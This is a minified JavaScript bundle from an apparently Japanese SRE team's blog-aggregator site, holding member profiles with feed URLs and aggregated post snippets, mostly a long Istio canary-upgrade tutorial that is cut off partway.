"use strict";(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[983],{1807:function(e,t,a){a.d(t,{T:function(){return o}});let o=[{id:"yteraoka",name:"yteraoka",role:"SRE",bio:"ojisan",avatarSrc:"/avatars/yteraoka.jpeg",sources:["https://blog.1q77.com/index.xml","https://qiita.com/yteraoka/feed","https://medium.com/feed/@yteraoka","https://zenn.dev/yteraoka/feed"],includeUrlRegex:"",twitterUsername:"yteraoka",githubUsername:"yteraoka",websiteUrl:"https://blog.1q77.com/"},{id:"tozastation",name:"tozastation",role:"SRE",bio:"tarako_chan",avatarSrc:"/avatars/tozastation.jpg",sources:["https://qiita.com/tozastation/feed"],includeUrlRegex:"",twitterUsername:"tozastation",githubUsername:"tozastation",websiteUrl:"https://github.com/tozastation"},{id:"kyohmizu",name:"kyohmizu",role:"SRE",bio:"mizumoto",avatarSrc:"/avatars/kyohmizu.png",sources:["https://kyohmizu.hatenablog.com/feed","https://qiita.com/kyohmizu/feed"],includeUrlRegex:"",twitterUsername:"kyohmizu",githubUsername:"kyohmizu",websiteUrl:"https://profile.kyohmizu.com/"},{id:"nwiizo",name:"nwiizo",role:"Software Developer",bio:"Brogrammer",avatarSrc:"/avatars/nwiizo.jpeg",sources:["https://syu-m-5151.hatenablog.com/feed","https://zenn.dev/nwiizo/feed"],includeUrlRegex:"",twitterUsername:"nwiizo",githubUsername:"nwiizo",websiteUrl:"https://nwiizo.github.io/"},{id:"skikkh",name:"skikkh",role:"SRE",bio:"skikkh",avatarSrc:"/avatars/skikkh.jpeg",sources:["https://qiita.com/skikkh/feed"],includeUrlRegex:"",twitterUsername:"skikkh",githubUsername:"skikkh",websiteUrl:""},{id:"toshikish",name:"toshikish",role:"SRE",bio:"Toshiki Shimomura",avatarSrc:"/avatars/toshikish.png",sources:["https://toshikish.hateblo.jp/feed","https://zenn.dev/toshikish/feed","https://qiita.com/toshikish/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"toshikish",websiteUrl:""},{id:"Sreake",name:"Sreake",role:"",bio:"This Is The Sreake Section Blog.",avatarSrc:"/avatars/sreake.png",sources:["https://sreake.com/feed/"],includeUrlRegex:"blog",excludeUrlRegex:"event",twitterUsername:"SreakeJ",githubUsername:"",websiteUrl:"https://sreake.com"},{id:"tez",name:"Takuya Tezuka",role:"JB",bio:"tez",avatarSrc:"/avatars/tezuka.jpeg",sources:["https://qiita.com/TT_Private/feed"],includeUrlRegex:"qiita.com/TT_Private",twitterUsername:"tt0603",githubUsername:"taku-tez",websiteUrl:"https://www.wantedly.com/id/takuya_tezuka"},{id:"sosan01",name:"Soichiro Tsuchida",role:"SRE",bio:"sosan",avatarSrc:"/avatars/sosan01.png",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"sosan01",websiteUrl:""},{id:"atsuya0",name:"Atsuya Tsukada",role:"SRE",bio:"human",avatarSrc:"/avatars/atsuya0.jpg",sources:["https://zenn.dev/tayusa/feed","https://qiita.com/atsuya0/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"atsuya0",websiteUrl:"https://github.com/atsuya0"},{id:"abnoumaru",name:"Takaaki Abe",role:"SRE (Team Leader)",bio:"walker",avatarSrc:"/avatars/abnoumaru.jpeg",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"abnoumaru",websiteUrl:"https://www.wantedly.com/id/abnoumaru"},{id:"genki-hashimoto",name:"Genki Hashimoto",role:"SRE",bio:"ongaku suki",avatarSrc:"/avatars/hashimoto.jpg",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"genki-hashimoto",websiteUrl:"https://www.wantedly.com/id/genki_hashimoto"},{id:"masasuzu",name:"SUZUKI, Masashi",role:"SRE",bio:"yasetai",avatarSrc:"/avatars/masasuzu.png",sources:["https://blog.masasuzu.net/feed"],includeUrlRegex:"",twitterUsername:"masasuz",githubUsername:"masasuzu",websiteUrl:"https://masasuzu.net"},{id:"kiyos",name:"Kyohei Saito",role:"SRE",bio:"haraheri",avatarSrc:"/avatars/kiyos.jpeg",sources:[],includeUrlRegex:"",twitterUsername:"kiyo_12_07",githubUsername:"kiyo-s",websiteUrl:""},{id:"mos914",name:"Yu Kaneko",role:"SRE",bio:"koke",avatarSrc:"/avatars/mos914.png",sources:["https://qiita.com/dirtymosschan/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"mos914",websiteUrl:""},{id:"unvavo",name:"nobu",role:"SRE",bio:"nobu",avatarSrc:"/avatars/nobu.png",sources:[],includeUrlRegex:"",twitterUsername:"unvavo",githubUsername:"unvavo",websiteUrl:""},{id:"hiroki-hasegawa",name:"Hiroki Hasegawa",role:"SRE",bio:"Let me know your favorite technology! ✌️",avatarSrc:"/avatars/hirokihasegawa.png",sources:["https://hiroki-hasegawa.hatenablog.jp/feed"],includeUrlRegex:"",twitterUsername:"Hiroki__IT",githubUsername:"hiroki-it",websiteUrl:"https://hiroki-it.github.io/tech-notebook/"},{id:"kokisato",name:"Koki Sato",role:"SRE",bio:"piyo",avatarSrc:"/avatars/kokisato.png",sources:["https://zenn.dev/kou_pg_0131/feed"],includeUrlRegex:"",twitterUsername:"koki_develop",githubUsername:"koki-develop",websiteUrl:"https://koki.me"},{id:"kaisato",name:"Kai Sato",role:"SRE",bio:"domo",avatarSrc:"/avatars/kaisato.png",sources:[],includeUrlRegex:"",twitterUsername:"KAI21441756",githubUsername:"kaitexio",websiteUrl:""},{id:"Pranc1ngPegasus",name:"Temma Fukaya",role:"Backend Engineer",bio:"Coffee addict ☕",avatarSrc:"/avatars/pranc1ngpegasus.png",sources:["https://zenn.dev/pranc1ngpegasus/feed","https://pranc1ngpegasus.hatenablog.com/rss"],includeUrlRegex:"",twitterUsername:"pranc1ngpegasus",githubUsername:"Pranc1ngPegasus",websiteUrl:"https://pranc1ngpegasus.com"},{id:"d-murota",name:"Daichi Murota",role:"SRE",bio:"d-murota",avatarSrc:"/avatars/d-murota.jpg",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"d-murota-w",websiteUrl:""},{id:"ysakurai",name:"Yusuke Sakurai",role:"SRE",bio:"ysakurai",avatarSrc:"/avatars/ysakurai.jpg",sources:["https://qiita.com/ys1/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"saku3",websiteUrl:""},{id:"tayakun",name:"Soichiro Taya",role:"SRE",bio:"tayakun",avatarSrc:"/avatars/tayakun.png",sources:["https://qiita.com/tayakun/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"tayatamn",websiteUrl:""},{id:"jigyakkuma",name:"Shinji Yamada",role:"Corporate Engineer",bio:"Shonan life",avatarSrc:"/avatars/jigyakkuma.png",sources:["https://blog.jigyakkuma.org/index.xml"],includeUrlRegex:"",twitterUsername:"jigyakkuma_",githubUsername:"jigyakkuma",websiteUrl:"https://blog.jigyakkuma.org"},{id:"SatohJohn",name:"SatohJohn",role:"Software Developer",bio:"SatohJohn",avatarSrc:"/avatars/satohjohn.png",sources:["https://qiita.com/satohjohn/feed","https://zenn.dev/satohjohn/feed"],includeUrlRegex:"",twitterUsername:"satohjohn",githubUsername:"satohjohn",websiteUrl:""},{id:"bayobayo0324",name:"bayobayo0324",role:"back/front/app Engineer",bio:"osake daisuki",avatarSrc:"/avatars/bayobayo0324.jpeg",sources:["https://qiita.com/bayobayo0324/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"bayobayo0324",websiteUrl:""},{id:"myamamoto",name:"myamamoto",role:"SRE",bio:"human",avatarSrc:"/avatars/myamamoto.jpeg",sources:["https://zenn.dev/ureuzy/feed"],includeUrlRegex:"",twitterUsername:"ureuzy",githubUsername:"ureuzy",websiteUrl:""},{id:"seno",name:"seno",role:"DBRE",bio:"seno",avatarSrc:"/avatars/seno.jpeg",sources:["https://zenn.dev/nedoko_dok0dko/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"senohirona",websiteUrl:""},{id:"sakama",name:"sakama",role:"SRE",bio:"homo sapiens",avatarSrc:"/avatars/sakama.jpeg",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"junichiro-sakama",websiteUrl:""},{id:"toVersus",name:"Tsubasa Nagasawa",role:"SRE",bio:"lazy programmer",avatarSrc:"/avatars/toVersus.png",sources:["https://qiita.com/toVersus/feed","https://zenn.dev/toversus/feed"],includeUrlRegex:"",twitterUsername:"toversus26",githubUsername:"toVersus",websiteUrl:""}].sort((e,t)=>e.id<t.id?-1:1)},9756:function(e,t,a){a.d(t,{T:function(){return n}});var o=a(5893),i=a(9008),r=a.n(i),s=a(2556);let n=e=>{let{path:t,title:a,description:i,ogImageUrl:n,noindex:c,removeSiteNameFromTitle:l}=e,p="".concat(s.v.siteRoot).concat(t||"");return(0,o.jsxs)(r(),{children:[(0,o.jsx)("title",{children:l?a:"".concat(a," | ").concat(s.v.siteMeta.title)}),(0,o.jsx)("meta",{property:"og:title",content:a}),(0,o.jsx)("meta",{property:"og:url",content:p}),(0,o.jsx)("meta",{name:"twitter:card",content:"summary_large_image"}),(0,o.jsx)("meta",{property:"og:site",content:s.v.siteMeta.title}),(0,o.jsx)("meta",{property:"og:image",content:n||"".concat(s.v.siteRoot,"/og.png")}),!!i&&(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)("meta",{name:"description",content:i}),(0,o.jsx)("meta",{property:"og:description",content:i})]}),t&&(0,o.jsx)("link",{rel:"canonical",href:p}),c&&(0,o.jsx)("meta",{name:"robots",content:"noindex"})]})}},518:function(e,t,a){a.d(t,{ci:function(){return r},gO:function(){return s},gb:function(){return n},n4:function(){return i}});var o=a(1807);function i(e){return o.T.find(t=>t.id===e)}function r(e){let t=new URL(e);return(null==t?void 0:t.hostname)||"blog"}function s(e){return"https://www.google.com/s2/favicons?domain=".concat(e)}function n(e){return"/members/".concat(encodeURIComponent(e))}a(8928)},8928:function(e){e.exports=JSON.parse('[{"title":"GitHub Actions Importer を使って CI/CD を GitHub Actions に移行する","contentSnippet":"GitHub Actions Importer が GA になりました \uD83C\uDF89\uD83C\uDF89\uD83C\uDF89https://github.blog/2023-03-01-github-actions-importer-is-now-generally-available/GitHub Actions Importer は様々な CI サービスから GitHub Actions への移行をサポートするツールです。他の CI サービスで使用している設定ファイルを元に GitHub Actions ワークフロー定義の YAML ファイルを自動で作成することができます。2023 年 03 月 02 日現在、次の CI...","link":"https://zenn.dev/kou_pg_0131/articles/gh-actions-importer","isoDate":"2023-03-02T08:10:59.000Z","dateMiliSeconds":1677744659000,"authorName":"Koki Sato","authorId":"kokisato"},{"title":"Snowflakeでのコスト管理","contentSnippet":"Snowflakeを最近触ってみることがあったので、コスト周りについて個人的に調べたログ参考ドキュメント↓Snowflakeでのコスト管理 | Snowflake Documentation お品書きSnowflakeのコストについてSnowflakeのコスト調査Snowflakeのコスト制御 SnowflakeのコストについてSnowflakeでのコストは次の3つの領域に分類される。コンピューティング: ユーザー管理(仮想ウェアハウス)、Snowflake管理(Snowpipeなどのサーバーレス機能)、およびクラウドサービスストレージ: データステージング...","link":"https://zenn.dev/nedoko_dok0dko/articles/ffe6450c4cd851","isoDate":"2023-02-28T10:45:26.000Z","dateMiliSeconds":1677581126000,"authorName":"seno","authorId":"seno"},{"title":"APIのエンドポイント設計で気をつけていること~ポエム編~","contentSnippet":"この記事は？日々の業務のなかで、フロントエンドチームの立場でAPIを利用したりバックエンドAPIチームの立場でAPIを設計実装改修したりする私のポエムみたいなものです。みなさまが日々の業務に疲れ…","link":"https://qiita.com/bayobayo0324/items/4b21a71c5fb0e0202fbc","isoDate":"2023-02-28T01:07:37.000Z","dateMiliSeconds":1677546457000,"authorName":"bayobayo0324","authorId":"bayobayo0324"},{"title":"Charm 製の Go ロギングライブラリ「Log」を試してみる","contentSnippet":"Charm 製の Go ロギングライブラリが出たので早速試してみたメモです。https://github.com/charmbracelet/log 検証環境Go v1.20charmbracelet/log v0.1.1 使い方 基本的な使い方以下のメソッドを使うと特定のレベルのログを出力します。log.Debug()log.Info()log.Warn()log.Error()log.Fatal()log.Print() は設定されているログレベルに関係なく出力されます。package mainimport \\"github.com/cha...","link":"https://zenn.dev/kou_pg_0131/articles/charm-log-introduction","isoDate":"2023-02-27T09:29:55.000Z","dateMiliSeconds":1677490195000,"authorName":"Koki Sato","authorId":"kokisato"},{"title":"【Istio⛵️】安全なアップグレード手法の仕組み","contentSnippet":"01. はじめに02. Istioのアップグレード手法を説明する前にカナリアリリースとはカナリアリリースの手順【１】【２】【３】【４】『カナリアリリース』の呼称の由来03. アップグレード手法の概要手順【１】【２】【３】【４】【５】【６】【７】【８】04. アップグレード手法の詳細手順前提NamespaceIstiodIngressGatewayマイクロサービス【１】 アップグレード前の検証ここで実施することistioctl x precheckコマンドkubectl getコマンド▼ IstiodのDeployment▼ Webhookの宛先のService▼ 宛先のServiceを決めるMutatingWebhookConfiguration【２】 新Istiodのインストールここで実施することistioctl versionコマンドistioctl installコマンドkubectl getコマンド▼ IstiodのDeployment▼ Webhookの宛先のService▼ Webhookの宛先のServiceを決めるMutatingWebhookConfiguration【３】 Webhookの宛先のServiceの変更ここで実施することistioctl tag setコマンド【４】 IngressGatewayをインプレースアップグレードここで実施することkubectl rollout restartコマンド【５】 一部のNamespaceのistio-proxyコンテナをアップグレードここで実施することkubectl rollout restartコマンド【６】 ユーザの手を借りたテストここで実施することもし問題が起こった場合【７】 istio-proxyコンテナの段階的なアップグレードここで実施することkubectl rollout restartコマンド【８】 旧Istiodのアンインストールここで実施することistioctl uninstallコマンドkubectl getコマンド▼ IstiodのDeployment▼ Webhookの宛先のService▼ 宛先のServiceを決めるMutatingWebhookConfiguration05. おわりに01. はじめに隠しません。有吉弘行のサンデーナイトドリーマーが生きがいです。さて今回は、Istioの安全なアップグレード手法の仕組みに関する記事を投稿しました\uD83D\uDE80執筆時点 (2023/02/26) では、IstioのIstiodコントロールプレーン (以降、Istiodとします) のアップグレード手法には、『インプレース方式』と『カナリア方式』があります。また合わせてアップグレードが必要なIstioのIngressGatewayにも、その手法に『インプレース方式』と『カナリア方式』があります。今回の安全なアップグレード手法として、Istiodでは『カナリアアップグレード』、IngressGatewayでは『インプレースアップグレード』を採用します。それでは、Istioの安全なアップグレード手法の仕組みをもりもり布教しようと思います\uD83D\uDE17 (沼のまわりに餌をまく)↪️ 参考：Istio / Canary UpgradesIstio / Installing Gateways02. Istioのアップグレード手法を説明する前にカナリアリリースとはIstiodのカナリアアップグレードが理解しやすくなるように、カナリアリリースから説明したいと思います。カナリアリリースは、実際のユーザーにテストしてもらいながらリリースする手法です。もしカナリアリリースをご存知の方は、 03. アップグレード手法の概要 まで飛ばしてください\uD83D\uDE47\uD83C\uDFFB‍♂️カナリアリリースの手順カナリアリリースは、一部のユーザーを犠牲にすることになる一方で、アプリを実地的にテストできる点で優れています。手順を交えながら説明します。↪️ 参考：CanaryRelease【１】旧環境のアプリを残したまま、新環境をリリースします。この段階では、全てのユーザー (100%) を旧環境にルーティングします。【２】ロードバランサーで重み付けを変更し、一部のユーザー (ここでは10%) を新環境にルーティングします。【３】ユーザーの手を借りて新環境を実地的にテストします (例：該当のエラーメトリクスが基準値を満たすか) 。【４】新環境に問題が起こらなければ、重み付けを段階的に変更し、最終的には全てのユーザー (100%) を新環境にルーティングします。『カナリアリリース』の呼称の由来カナリアリリースについては、その呼称の由来を知ると、より理解が深まります。カナリアリリースは、20世紀頃の炭坑労働者の危機察知方法に由来します。炭鉱内には有毒な一酸化炭素が発生する場所がありますが、これは無色無臭なので、気づくことに遅れる可能性があります。そこで当時の炭鉱労働者は、一酸化炭素に敏感な『カナリア』を炭鉱内に持ち込み、カナリアの様子から一酸化炭素の存在を察知するようにしていたそうです。つまり、先の『犠牲になる一部のユーザー』が、ここでいうカナリアというわけです\uD83D\uDE28画像引用：George McCaa, U.S. Bureau of Mines↪️ 参考：About canary deployment in simple wordsThis Device Was Used to Resuscitate Canaries in Coal Mines After They Signaled Danger03. アップグレード手法の概要手順カナリアリリースについて理解したところで、Istioの安全なアップグレード手法の概要を説明します。おおよそ以下の手順からなります。【１】旧Istiodが稼働しています。【２】新Istiod (discoveryコンテナ) をインストールします。【３】新Istiodのistio-proxyコンテナをインジェクションできるように、Webhookの宛先のServiceを変更します。この手順は重要で、後のistioctl tag setコマンドの箇所で詳細を説明しています。【４】IngressGatewayをインプレースアップグレードします。【５】一部のNamespaceで、istio-proxyコンテナをカナリアアップグレードします。ここで、カナリアリリースのような重み付けがなく、カナリアアップグレードの『カナリア』という呼称に違和感を持つ方がいるかもしれません。これについては、全てのNamespaceのistio-proxyコンテナを一斉にアップグレードするのではなく、段階的にアップグレードしていく様子を『カナリア』と呼称している、と個人的に推測しています。もし『カナリアアップグレード』の由来をご存じの方は、教えていただきたいです\uD83D\uDE47\uD83C\uDFFB‍♂️【６】ユーザーの手を借りて、実地的にテストします (例：該当のエラーメトリクスが基準値以下を満たすか) 。【７】新Istiodのistio-proxyコンテナに問題が起こらなければ、他のNamespaceでもistio-proxyコンテナを段階的にカナリアアップグレードしていきます。一方でもし問題が起これば、Namespaceのistio-proxyコンテナとIngressGatewayをダウングレードします。【８】最後に、旧Istiodをアンインストールします。↪️ 参考：Istio / Canary Upgrades04. アップグレード手法の詳細手順ここからは、03. アップグレード手法の概要 を深ぼっていきます。ヤサイニンニクアブラマシマシな説明になってしまったので、ここまでを食べ切れた方のみ進むことをお勧めします\uD83E\uDD7A今回は、ドキュメントで一番優先して記載されているistioctlコマンドを使用した手順を説明します。もちろん、他のツール (例：Helm、ArgoCD) を使用してもアップグレードできます。細かな手順が異なるだけで、アップグレード手法の概要に関しては同じです\uD83D\uDE46‍♂️それでは、03. アップグレード手法の概要 の【１】〜【８】に対応させながら説明していくゾ。前提Namespaceまず最初に、前提となる状況を設定しておきます。各Namespaceのistio.io/revラベルにdefaultが設定されているとします。$ kubectl get namespace -L istio.io/revNAME              STATUS   AGE   REVfoo               Active   34d   defaultbar               Active   34d   defaultbaz               Active   34d   defaultistio-ingress     Active   34d   default...マニフェストに書き起こすと以下のようになっています。apiVersion: v1kind: Namespacemetadata:  name: foo  labels:    istio.io/rev: defaultエイリアスはどんな値でも問題なく、よくあるエイリアスとしてdefaultやstableなどを使用します。このistio.io/revラベルがあることで、そのNamespaceのPodにistio-proxyコンテナを自動的にインジェクションします。istio-proxyコンテナのインジェクションについては、こちら記事で説明しており、もし気になる方はこちらもよろしくどうぞ\uD83D\uDE47\uD83C\uDFFB‍♂️Istiodすでに1-14-6のIstiodが動いており、1-15-4にカナリアアップグレードします。IstiodはDeployment配下のPodであり、このPodはIstiodの実体であるdiscoveryコンテナを持ちます。$ kubectl get deployment -n istio-system -l app=istiodNAME                   READY   UP-TO-DATE   AVAILABLE   AGEistiod-1-14-6          1/1     1            1           47s # 1-14-6IngressGatewayIngressGatewayはIstiodとは異なるNamespaceで動いており、インプレースアップグレードします。IngressGatewayはistio-proxyコンテナを持ちます。$ kubectl get deployment -n istio-ingressNAME                   READY   UP-TO-DATE   AVAILABLE   AGEistio-ingressgateway   1/1     1            1           47s補足として、セキュリティのベストプラクティスでは、IstiodとGatewayは異なるNamespaceで動かすことが推奨されています。↪️ 参考：Istio / Installing Gatewaysマイクロサービス各Namespaceでマイクロサービスが動いています。マイクロサービスのPodはistio-proxyコンテナを持ちます。$ kubectl get deployment -n fooNAME   READY   UP-TO-DATE   AVAILABLE   AGEfoo    2/2     1            1           47s...$ kubectl get deployment -n barNAME   READY   UP-TO-DATE   AVAILABLE   AGEbar    2/2     1            1           47s..$ kubectl get deployment -n bazNAME   READY   UP-TO-DATE   AVAILABLE   AGEbaz    2/2     1            1           47s...【１】 アップグレード前の検証ここで実施することアップグレード前に、現在のKubernetes Clusterがアップグレード要件を満たしているかを検証します。↪️ 参考：Before you upgradeistioctl x precheckコマンドistioctl x precheckコマンドを実行し、アップグレード要件を検証します。$ istioctl x precheck✅ No issues found when checking the cluster.Istiois safe to install or upgrade!  To get started, check out https://istio.io/latest/docs/setup/getting-started/問題がなければ、istioctlコマンドはNo issue ...の文言を出力します。もし、問題がある場合、istioctlコマンドはエラー文言を出力します。例えば、Istioのistio-proxyコンテナのインジェクションではkube-apiserverと通信する必要があります。そのため、kube-apiserverのバージョンが古すぎるせいでIstioが非対応であると、エラーになります。kubectl getコマンド▼ IstiodのDeploymentkubectl getコマンドを実行し、現在のIstiodのバージョンを確認します\uD83D\uDC40まずはIstiodのDeploymentを確認すると、1-14-6のDeploymentがあります。$ kubectl get deployment -n istio-system -l app=istiodNAME                   READY   UP-TO-DATE   AVAILABLE   AGEistiod-1-14-6          1/1     1            1           47s # 1-14-6istio-proxyコンテナのインジェクションの仕組みでいうと、以下の赤枠の要素です\uD83D\uDC47▼ Webhookの宛先のService次に、 Serviceを確認すると、1-14-6のServiceがあります。$ kubectl get service -n istio-system -l app=istiodNAME            TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                                 AGEistiod-1-14-6   ClusterIP   10.96.93.151     <none>        15010/TCP,15012/TCP,443/TCP,15014/TCP   109s # 1-14-6このServiceは、kube-apiserverからIstiodへのWebhookを仲介することにより、istio-proxyコンテナのインジェクションを可能にします。istio-proxyコンテナのインジェクションの仕組みでいうと、以下の赤枠の要素です\uD83D\uDC47▼ 宛先のServiceを決めるMutatingWebhookConfiguration最後に、MutatingWebhookConfigurationを確認すると、istio-revision-tag-<エイリアス>とistio-sidecar-injector-<リビジョン番号>のMutatingWebhookConfigurationがあります。$ kubectl get mutatingwebhookconfigurationsNAME                            WEBHOOKS   AGEistio-revision-tag-default      2          114s  # カナリアアップグレード用istio-sidecar-injector-1-14-6   2          2m16s # インプレースアップグレード用のため今回は言及しないistio-proxyコンテナのインジェクションの仕組みでいうと、以下の赤枠の要素です\uD83D\uDC47これらのうち、前者 (istio-revision-tag-<エイリアス>) をカナリアアップグレードのために使用します。このMutatingWebhookConfigurationは、Webhookの宛先のServiceを決めるため、結果的にistio-proxyコンテナのバージョンを決めます。ここで、MutatingWebhookConfigurationのistio.io/revラベルとistio.io/tagラベルの値も確認しておきます。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.metadata.labels\'...istio.io/rev: 1-14-6istio.io/tag: default...istio.io/revラベルはIstiodのバージョン、istio.io/tagラベルはこれのエイリアスを表しています。また、.webhooks[].namespaceSelectorキー配下のistio.io/revキーの検知ルールを確認します。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.webhooks[]\'...namespaceSelector:  matchExpressions:    - key: istio.io/rev      operator: In      values:        - default...合わせて、.webhooks[].clientConfig.serviceキー配下のServiceを名前を確認します。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.webhooks[].clientConfig\'...service:  name: istiod-1-14-6...整理すると、Namespaceでistio.io/revラベルにdefaultを設定しておけば、MutatingWebhookConfigurationがそれを検知し、特定のIstioのバージョンのServiceにWebhookを送信できるようになっています。↪️ Istio / Safely upgrade the Istio control plane with revisions and tags【２】 新Istiodのインストールここで実施することそれでは、新Istiodをインストールします。↪️ 参考：Control planeistioctl versionコマンド新しくインストールするIstiodのバージョンは、istioctlコマンドのバージョンで決まります。そこで、istioctl versionコマンドを実行し、これのバージョンを確認します。$ istioctl versionclient version: 1.15.4        # アップグレード先のバージョンcontrol plane version: 1.14.6 # 現在のバージョンdata plane version: 1.14.6istioctl installコマンドカナリアアップグレードの場合、istioctl installコマンドを実行します。ドキュメントではrevisionキーの値がcanaryですが、今回は1-15-4とします。この値は、Istioが使用する様々なKubernetesリソースの接尾辞や、各種リソースのistio.io/revラベルの値になります。$ istioctl install --set revision=1-15-4WARNING: Istio is being upgraded from 1.14.6 -> 1.15.4WARNING: Before upgrading, you may wish to use \'istioctl analyze\' to check for IST0002 and IST0135 deprecation warnings.✅ Istio core installed✅ Istiod installed✅ Ingress gateways installed✅ Installation completeThank you for installing Istio 1.15.  Please take a few minutes to tell us about your install/upgrade experience!kubectl getコマンド▼ IstiodのDeploymentkubectl getコマンドを実行し、istioctl installコマンドで何をインストールしたのかを確認します\uD83D\uDC40まずはIstiodのDeploymentを確認すると、1-15-4というDeploymentが新しく増えています。$ kubectl get deployment -n istio-system -l app=istiodNAME            READY   UP-TO-DATE   AVAILABLE   AGEistiod-1-14-6   1/1     1            1           47s # 1-14-6istiod-1-15-4   1/1     1            1           47s # 1-15-4接尾辞の1-15-4は、revisionキーの値で決まります。この段階では、旧Istiodと新Istioが並行的に稼働しており、kube-apiserverはまだ旧Istiodと通信しています今の状況は以下の通りです\uD83D\uDC47▼ Webhookの宛先のService次に Webhookの宛先のServiceを確認すると、istiod-1-15-4というServiceが新しく増えています。$ kubectl get service -n istio-system -l app=istiodNAME            TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                                 AGEistiod-1-14-6   ClusterIP   10.96.93.151     <none>        15010/TCP,15012/TCP,443/TCP,15014/TCP   109s # 1-14-6istiod-1-15-4   ClusterIP   10.104.186.250   <none>        15010/TCP,15012/TCP,443/TCP,15014/TCP   87s  # 1-15-4この段階では、まだWebhookの宛先はistiod-1-14-6のServiceです。今の状況は以下の通りです\uD83D\uDC47▼ Webhookの宛先のServiceを決めるMutatingWebhookConfiguration最後にMutatingWebhookConfigurationを確認すると、istio-sidecar-injector-1-15-4というMutatingWebhookConfigurationが新しく増えています。$ kubectl get mutatingwebhookconfigurationsNAME                            WEBHOOKS   AGEistio-revision-tag-default      2          114s  # カナリアアップグレードで使用するistio-sidecar-injector-1-14-6   2          2m16sistio-sidecar-injector-1-15-4   2          2m16sカナリアアップグレードでは、istio-revision-tag-<エイリアス>のMutatingWebhookConfigurationを使用します。今の状況は以下の通りです\uD83D\uDC47※ 実は、他にもインストールしているものがあるのですが、話をわかりやすくするために、今回は言及していません\uD83D\uDE47\uD83C\uDFFB‍♂️【３】 Webhookの宛先のServiceの変更ここで実施することこの手順では、エイリアスのistio.io/tagラベルはそのままに、istio.io/revラベルの値を変更します。さらに、Webhookの宛先のServiceを変更します。↪️ 参考：Default tagSafely upgrade the Istio control plane with revisions and tagsistioctl tag setコマンドistioctl tag setコマンドを実行し、istio.io/revラベルの値と宛先のServiceを変更します。$ istioctl tag set default --revision 1-15-4 --overwrite実行後に、もう一度MutatingWebhookConfigurationを確認すると、istio.io/revラベルの値が変わっています。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.metadata.labels\'...istio.io/rev: 1-15-4istio.io/tag: default...また、Webhookの宛先のServiceも変わっています。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.webhooks[].clientConfig\'...service:  name: istiod-1-15-4...これらにより、Webhookの宛先が1-15-4のServiceとなるため、1-15-4のistio-proxyコンテナをインジェクションできるようになります。今の状況は以下の通りです\uD83D\uDC47【４】 IngressGatewayをインプレースアップグレードここで実施することWebhookの宛先が1-15-4のServiceに変わったところで、IngressGatewayをインプレースアップグレードします。↪️ 参考：In place upgradekubectl rollout restartコマンドkubectl rollout restartコマンドを実行し、IngressGatewayをインプレースアップグレードします。$ kubectl rollout restart deployment istio-ingressgateway-n istio-ingress再作成したPodのイメージを確認してみると、istio-proxyコンテナを1-15-4にアップグレードできています。$ kubectl get pod bar -n bar -o yaml | yq \'.spec.containers[].image\'docker.io/istio/proxyv2:1.15.4 # istio-proxyコンテナ今の状況は以下の通りです\uD83D\uDC47なお、IngressGatewayのアップグレード時、マイクロサービスへのインバウンド通信が遮断されてしまうと思った方がいるかもしれません。この点については、DeploymentがローリングアップグレードでIngressGatewayのPodを入れ替えるため、安心していただいて問題ありません\uD83D\uDE46‍♂️【５】 一部のNamespaceのistio-proxyコンテナをアップグレードここで実施すること続けて、一部のNamespaceのistio-proxyコンテナをアップグレードします。Podの再作成により、新Istiodのistio-proxyコンテナがインジェクションされるため。istio-proxyコンテナをアップグレードできます。↪️ 参考：Data planekubectl rollout restartコマンド前提にあるように、Namespaceには foo bar baz があります。kubectl rollout restartコマンドを実行し、barのistio-proxyコンテナからアップグレードします。$ kubectl rollout restart deployment bar -n bar再作成したPodのイメージを確認してみると、istio-proxyコンテナを1-15-4にアップグレードできています。$ kubectl get pod bar -n bar -o yaml | yq \'.spec.containers[].image\'bar-app:1.0 # マイクロサービスdocker.io/istio/proxyv2:1.15.4 # istio-proxyコンテナ今の状況は以下の通りです\uD83D\uDC47【６】 ユーザの手を借りたテストここで実施することIstioを部分的にアップグレードしたところで、アップグレードが完了したNamespaceをテストします。ユーザーの手を借りて実地的にテストします (例：該当のエラーメトリクスが基準値を満たすか) 。今の状況は以下の通りです\uD83D\uDC47もし問題が起こった場合もし問題が起こった場合、1-14-6にダウングレードしていきます。istioctl tag setコマンドを実行し、istio.io/revラベルの値を元に戻します。$ istioctl tag set default --revision 1-14-6 --overwriteその後、kubectl rollout restartコマンドの手順を実行し、istio-proxyコンテナをダウングレードしてきます。【７】 istio-proxyコンテナの段階的なアップグレードここで実施すること先のNamespaceで問題が起こらなければ、残ったNamespace (foo、baz、...) のistio-proxyコンテナも段階的にアップグレードしていきます。kubectl rollout restartコマンド同様にkubectl rollout restartコマンドを実行し、istio-proxyコンテナからアップグレードします。$ kubectl rollout restart deployment foo -n foo$ kubectl rollout restart deployment baz -n baz...最終的に、全てのNamespacemのistio-proxyコンテナが新しくなります。今の状況は以下の通りです\uD83D\uDC47【８】 旧Istiodのアンインストールここで実施すること最後に、旧Istiodのアンインストールします。↪️ 参考：Uninstall old control planeistioctl uninstallコマンドistioctl uninstallコマンドを実行し、旧Istiodをアンインストールします。$ istioctl uninstall --revision 1-14-6✅ Uninstall complete今の状況は以下の通りです\uD83D\uDC47kubectl getコマンド▼ IstiodのDeploymentkubectl 